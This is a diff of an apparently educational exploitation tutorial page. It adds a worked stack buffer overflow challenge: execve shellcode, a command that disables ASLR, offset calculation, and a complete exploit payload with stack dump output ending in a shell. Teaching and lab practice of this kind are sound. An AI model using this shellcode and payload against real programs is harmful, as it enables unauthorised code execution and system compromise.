@@ -649,7 +649,7 @@ main:
             <p>(No matter how complicated the overflow, it'll generally boil down to 3 things: Identifying the overflow, Identifying a place to jump to, and how the input is handled)</p>
         </div>
         <div class="col-sm-3">
-            <pre><code class="cpp" id="overflow-call-ex">#include &ltstring.h&gt
+            <pre><code class="cpp" id="overflow-call-ex">#include &lt;string.h&gt;
 #include &lt;stdio.h&gt;
 
 void mycpy(char* str)
@@ -998,7 +998,7 @@ mov $0x0b, %al
         <div class="col-sm-6 col-sm-offset-3">
             <div class="row">
                 <div class="col-sm-8">
-                    <p>The second NULL byte comes from NULL terminating the '/bin/sh' string. We need to NULL terminate the string still so we'll put a 0x0 value into <b>edx</b> because it'll be 0x0 later anyway and we can use it now by pushing it to the stack now. Then we can push the string to the stack and it will be followed by 0x0 because we pushed <b>edx</b> first. We run into a problem now though because we our last bytes of the string are not word aligned. We can solve this by adding extra <b>/</b>'s (0x2f in byte form). This is acceptable because you can add as many <b>/</b>'s to a string or command consecutively and it will not change the command. You can try this in linux with the <b>cd</b> command (e.g. cd ~///////////////Documents).</p>
+                    <p>The second NULL byte comes from NULL terminating the '/bin/sh' string. We need to NULL terminate the string still so we'll put a 0x0 value into <b>edx</b> because it'll be 0x0 later anyway and we can use it now by pushing it to the stack now. Then we can push the string to the stack and it will be followed by 0x0 because we pushed <b>edx</b> first. We run into a problem now though because we our last bytes of the string are not word aligned. We can solve this by adding extra <b>/</b>'s (0x2f in byte form). This is acceptable because you can add as many <b>/</b>'s to a string or command consecutively and it will not change the command. You can try this in linux with the <b>cd</b> command (e.g. cd ~///////////////Documents will still work).</p>
                 </div>
                 <div class="col-sm-4">
                     <pre><code class="cpp hljs">push $0x0068732f
@@ -1076,18 +1076,87 @@ main:
 </code></pre>
         </div>
     </div>
+    <div class="row bottom-pad">
+        <div class="col-sm-6 col-sm-offset-3">
+            <p>We can see that there are no NULL bytes at all in our bytecode! Let's just quickly translate that into something that python could ouptut, here it is: <b>'\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'</b> (25 bytes). Now thatf we finally have our non-NULL byte shellcode, let's put it to use!</p>
+        </div>
+    </div>
+    <h3 class="text-center">Applying What You Know (shell_overflow)</h3>
+    <div class="row" id="shellcode-challenge">
+        <div class="col-sm-4 col-sm-offset-4">
+            <pre><code class="language-cpp">Stack dump:
+0xffffd120: 0xffffd3c5 (first argument)
+0xffffd11c: 0x08048599 (saved eip)
+0xffffd118: 0xffffd148 (saved ebp)
+0xffffd114: 0xf7eb6306
+0xffffd110: 0x000003e8
+0xffffd10c: 0xf7eb6300
+0xffffd108: 0xffffd184
+0xffffd104: 0xf7fee010
+0xffffd100: 0xffffd148
+0xffffd0fc: 0xf7fb6000
+0xffffd0f8: 0xf7fb6000
+0xffffd0f4: 0xffffd160
+0xffffd0f0: 0xf7fe780b
+0xffffd0ec: 0xf7eb6330
+0xffffd0e8: 0x000003e8
+0xffffd0e4: 0x000003e8
+0xffffd0e0: 0xffffd148
+0xffffd0dc: 0x00000000
+0xffffd0d8: 0x000000e0
+0xffffd0d4: 0x0804826c
+0xffffd0d0: 0xf7ffd000 (beginning of buffer)
+</code></pre>
+        </div>
+    </div>
     <div class="row">
         <div class="col-sm-6 col-sm-offset-3">
-            <p>We can see that there are no NULL bytes at all in our bytecode! Let's just quickly translate that into something that python could ouptut, here it is: '\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' (25 bytes). Now that we finally have our non-NULL byte shellcode, let's put it to use!</p>
+            <p>This output is from the shell_overflow challenge which can be downloaded <a href="../file_resources_overflow-4" download="shell_overflow.o">here</a>. To do this challenge easily, we're going to turn of ASLR (Address Space Layout Randomization) which randomizes the location of the stack. To disable ASLR you can use the command <b>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</b>. To re-enable ASLR you can use the command <b>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</b>. Now, every time you run this the addresses printed out on the left column will be the same.</p>
+            <p>Play with the binary a bit and see what you can find out before continuing... or just keep reading I'm not the police. The label of <b>beginning of buffer</b> at address <b>0xffffd0d0</b> is the start of our input and the <b>saved eip</b> is at <b>0xffffd11c</b>. To get to the start of the <b>saved eip</b> is only <b>0xffffd11c - 0xffffd0d0</b> or <b>0x4c</b> (76) bytes. So now we're at the <b>saved eip</b>, but what do we want to do? There's no real place to go with this buffer overflow so our only option right now is to use shellcode.</p>
+            <p>What should we do with our shellcode? Should we put it at the beginning, middle, or end of our input and what should we put for the value of the <b>saved eip</b>? That's right, we should put it at the beginning override the value of the <b>saved eip</b> with the location of the shellcode (What is this, dora the explorer)! Putting the shellcode at the beginning of the buffer will allow us to use the <b>0xffffd0d0</b> address as the beginning of the shellcode. Let's see what this looks like:</p>
+        </div>
+    </div>
+    <div class="row" id="shellcode-challenge">
+        <div class="col-sm-4 col-sm-offset-4">
+            <pre><code class="language-cpp">./overflow-4 $(python -c "print  '\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'a'*51 + '\x80\xd0\xff\xff'")
+Stack dump:
+0xffffd0d0: 0xffffd300 (first argument)
+0xffffd0cc: 0xffffd080 (saved eip)
+0xffffd0c8: 0x61616161 (saved ebp)
+0xffffd0c4: 0x61616161
+0xffffd0c0: 0x61616161
+0xffffd0bc: 0x61616161
+0xffffd0b8: 0x61616161
+0xffffd0b4: 0x61616161
+0xffffd0b0: 0x61616161
+0xffffd0ac: 0x61616161
+0xffffd0a8: 0x61616161
+0xffffd0a4: 0x61616161
+0xffffd0a0: 0x61616161
+0xffffd09c: 0x61616161
+0xffffd098: 0x61616180
+0xffffd094: 0xcde18953
+0xffffd090: 0x52e3896e
+0xffffd08c: 0x69622f68
+0xffffd088: 0x68732f2f
+0xffffd084: 0x6852d231
+0xffffd080: 0x0bb0c031 (beginning of buffer)
+$ 
+</code></pre>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-sm-6 col-sm-offset-3">
+            <p>We did it! We put our shellcode at the beginning of the input and then padded it with 51 bytes because it's 76 bytes to the <b>saved eip</b> and our shellcode is 25 bytes. Now we just add the 4 byte address of the beginning of our buffer and then we get a shell.</p>
         </div>
     </div>
     <div class="row" id="format-strings">
-        <h2 class="text-center"><b>Format Strings</b></h1>
-            <h3 class="text-center">Coming Soon!</h2>
+        <h2 class="text-center"><b>Format Strings</b></h2>
+        <h3 class="text-center">Coming Soon!</h3>
     </div>
     <div class="row" id="rop">
-        <h2 class="text-center"><b>ROP: Return Oriented Programming</b></h1>
-                <h3 class="text-center">Coming Soon!</h2>
+        <h2 class="text-center"><b>ROP: Return Oriented Programming</b></h2>
+        <h3 class="text-center">Coming Soon!</h3>
     </div>
     <div class="row" id="heap-exploit">
         <h2 class="text-center"><b>Heap Exploitation</b></h2>
